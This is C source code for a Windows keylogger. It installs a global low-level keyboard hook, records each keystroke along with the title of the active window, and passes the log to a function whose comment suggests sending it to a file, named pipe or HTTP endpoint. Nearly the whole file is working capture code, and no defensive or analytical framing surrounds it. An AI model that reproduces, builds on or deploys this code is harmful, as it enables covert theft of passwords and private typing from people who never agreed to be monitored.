#include <windows.h>
#include <stdio.h>

#define MAX_BUFFER_SIZE 1024
#define MAX_NAME_SIZE 256

CHAR previous[MAX_NAME_SIZE];

VOID WriteLog(CHAR *buffer) {
    // Send the buffer to a file / namedpipe / HTTP whatever make you happy
    printf("%s\n", buffer);
}

LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
    KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;

    CHAR *charset[] = {"", "", "", "", "", "", "", "", "[backspace]", "[tab]", "", "", "", "[enter]", "", "", "", "[ctrl]", "[alt]", "", "[caps lock]", "", "", "", "", "", "", "[esc]", "", "", "", "", "[spacebar]", "[page up]", "[page down]", "", "", "", "", "", "", "", "", "", "[print screen]", "[insert]", "[delete]", "" };
    CHAR buffer[MAX_BUFFER_SIZE];
    CHAR current[MAX_NAME_SIZE];
    SHORT caps = 1;
    HWND hWindow = GetForegroundWindow();
    GetWindowText(hWindow, current, MAX_NAME_SIZE);

    if(!strcmp(previous, current) == 0) {
        strncpy(previous, current, MAX_NAME_SIZE);
        snprintf(buffer, MAX_BUFFER_SIZE, "%s\n----------------------------------\n", previous);
        WriteLog(buffer);
    }

    SHORT capIsPressed = GetKeyState(VK_CAPITAL);
    if(capIsPressed > 0) {
        caps = 0;
    }

    if(kbd->vkCode == VK_LSHIFT || kbd->vkCode == VK_RSHIFT) {
        caps = 0;
    }

    if(wParam == WM_KEYDOWN) {
        caps = 0;
    }

    if(kbd->vkCode <= 0x2f) {
        snprintf(buffer, MAX_BUFFER_SIZE, "%s", charset[kbd->vkCode]);
        WriteLog(buffer);
    }

    if(kbd->vkCode >= 0x30 && kbd->vkCode <= 0x39) {
        snprintf(buffer, MAX_BUFFER_SIZE, "%d", kbd->vkCode - 0x30);
        WriteLog(buffer);
    }

    if(kbd->vkCode >= 0x41 && kbd->vkCode <= 0x5A) {
        snprintf(buffer, MAX_BUFFER_SIZE, "%c", kbd->vkCode + (32 * caps));
        WriteLog(buffer);        
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    ZeroMemory(previous, MAX_NAME_SIZE);

    HHOOK hhook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, GetModuleHandle(NULL), 0);

    MSG msg;

    while(GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hhook);

    return 0;
}
